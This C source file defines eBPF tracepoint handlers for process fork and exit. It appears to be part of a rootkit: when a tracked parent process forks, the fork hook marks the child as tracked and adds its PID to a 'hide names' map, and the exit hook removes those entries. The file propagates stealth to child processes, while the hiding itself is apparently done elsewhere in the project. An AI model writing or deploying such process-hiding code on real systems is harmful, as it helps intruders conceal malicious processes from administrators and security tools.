#include <vmlinux.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include "bpf/maps.h"
#include "config.h"

/**
 * @brief Fork hook to check if parent is marked tracked for hiding
 * and mark the child accordingly and add it to hidden names.
 * 
 */
SEC("tracepoint/sched/sched_process_fork")
int handle_fork(struct trace_event_raw_sched_process_fork *ctx)
{
    pid_t parent = ctx->parent_pid;
    pid_t child  = ctx->child_pid;

    if (!bpf_map_lookup_elem(&tracked_pids_map, &parent))
        return 0;

    char pid[MAX_NAME_LEN];
    u8 flag = 1;
    u64 child_u64 = (u64)child;

    bpf_snprintf(pid, sizeof(pid), "%u", &child_u64, sizeof(child_u64));

    bpf_map_update_elem(&tracked_pids_map, &child, &flag, BPF_ANY);
    bpf_map_update_elem(&hide_names_map, &pid, &flag, BPF_ANY);

    return 0;
}

/**
 * @brief Process exit hook to remove tracked process from map when it exits.
 * 
 */
SEC("tracepoint/sched/sched_process_exit")
int handle_exit(struct trace_event_raw_sched_process_template *ctx)
{
    pid_t pid = bpf_get_current_pid_tgid() >> 32;
    char pid_str[MAX_NAME_LEN];
    u64 pid_u64 = (u64)pid;

    bpf_snprintf(pid_str, sizeof(pid_str), "%u", &pid_u64, sizeof(pid_u64));

    bpf_map_delete_elem(&tracked_pids_map, &pid);
    bpf_map_delete_elem(&hide_names_map, &pid_str);

    return 0;
}
